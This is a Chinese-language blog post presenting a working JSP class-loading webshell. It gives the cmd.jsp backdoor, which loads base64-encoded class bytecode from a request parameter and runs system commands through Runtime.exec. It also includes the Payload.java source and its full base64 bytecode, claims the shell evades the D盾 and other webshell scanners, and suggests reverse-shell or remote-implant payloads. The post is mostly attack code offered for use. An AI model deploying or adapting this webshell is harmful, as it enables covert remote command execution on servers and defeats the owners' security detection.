# [知识星球]JSP类加载后门


<meta name="referrer" content="no-referrer" />

## 前言

在[上篇文章](https://yzddmr6.tk/posts/webshell-bypass-jsp/)的最后我提到了可以用类加载实现一个类似php回调函数的后门，在这篇文章里实现了一下，供大家借鉴参考。

## 正文

### 基本原理

相当于一个shellcode加载器。客户端只留一个任意类的加载器，然后我们只需要把想要执行的类的二进制字节码传进去就可以了。其实还是冰蝎的思路，但是冰蝎每次执行不同的命令都需要重新编译class，而本文是将要执行的参数通过额外参数传了进去，就不用来回编译了。

我后来想一想觉得蚁剑可以采用这种模式，不需要额外调用jar包来产生payload，直接把payload写死然后额外传参。这样蚁剑中就只需要保留字符串格式的payload就可以了。

### 具体利用

样例中是执行系统命令的payload，你也可以改成别的弹shell之类的payload。

新建Payload.java

```
import java.util.Scanner;
public class Payload {
    public String test(String cmd)  throws Exception{
            Process e= Runtime.getRuntime().exec(cmd);
            Scanner s = new Scanner(e.getInputStream()).useDelimiter("\\A");
            String result = "
<pre>";
            result+=   s.hasNext() ? s.next() : "";
            s.close();
            result+="</pre>";
            return result;
    }
}
```

因为没加包名，手动javac编译一下，然后base64生成的class文件

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900406437-1c6517cd-d52f-4349-bc87-16938a901671.png)

去掉多余的换行，这就是我们执行命令的payload了，找个记事本保存一下。

```
yv66vgAAADIATwoAFAAlCgAmACcKACYAKAcAKQoAKgArCgAEACwIAC0KAAQALggALwcAMAoACgAlCgAKADEKAAQAMgoABAAzCAA0CgAKADUKAAQANggANwcAOAcAOQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAR0ZXN0AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwA4BwA6BwA7BwApBwAwAQAKRXhjZXB0aW9ucwcAPAEAClNvdXJjZUZpbGUBAAxQYXlsb2FkLmphdmEMABUAFgcAPQwAPgA/DABAAEEBABFqYXZhL3V0aWwvU2Nhbm5lcgcAOwwAQgBDDAAVAEQBAAJcQQwARQBGAQAFPHByZT4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwARwBIDABJAEoMAEsATAEAAAwATQBMDABOABYBAAY8L3ByZT4BAAdQYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAh0b1N0cmluZwEABWNsb3NlACEAEwAUAAAAAAACAAEAFQAWAAEAFwAAAB0AAQABAAAABSq3AAGxAAAAAQAYAAAABgABAAAAAwABABkAGgACABcAAADLAAMABQAAAF64AAIrtgADTbsABFkstgAFtwAGEge2AAhOEgk6BLsAClm3AAsZBLYADC22AA2ZAAottgAOpwAFEg+2AAy2ABA6BC22ABG7AApZtwALGQS2AAwSErYADLYAEDoEGQSwAAAAAgAYAAAAHgAHAAAABQAIAAYAGQAHAB0ACABBAAkARQAKAFsACwAbAAAANwAC/wA3AAUHABwHAB0HAB4HAB8HAB0AAQcAIP8AAQAFBwAcBwAdBwAeBwAfBwAdAAIHACAHAB0AIQAAAAQAAQAiAAEAIwAAAAIAJA==
```

客户端cmd.jsp

```
<%@ page import="sun.misc.BASE64Decoder" %>
<%!
    public static class Myloader extends ClassLoader
    {
        public  Class get(byte[] b)
        { return super.defineClass(b, 0, b.length); }
    }
%>
<%
    String cmd=request.getParameter("cmd");
    String classStr=request.getParameter("class");
    if (cmd !=null & classStr!=null){
        BASE64Decoder code=new sun.misc.BASE64Decoder();
        Class result=new Myloader().get(code.decodeBuffer(classStr));
        out.print(result.getMethod("test",String.class).invoke(result.newInstance(),cmd));
    }
%>
```

大体意思就是接收到两个参数，一个是class字节码，一个是要执行的cmd命令。然后用类反射调用payload中的test方法。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900406542-e358e0ca-1265-4b2b-acd1-240a5d1c82f9.png)

可以秒D盾跟scanner

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900406639-1c812e48-a1b8-4c1f-b71e-f5ecf073a691.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900406764-74484704-e20b-414f-80a1-c39964b7cbb9.png)

上篇文章中用类反射调用其实还是会被发现，因为只是字符串的简单变形。而类加载的话可以做到客户端都是正常代码，只有payload传过去的时候才会执行恶意命令。并且payload可控，在不改动客户端的情况下，我们可以把payload改成其他想执行的命令，例如远程种马这种。

其他姿势大家自行发挥吧~
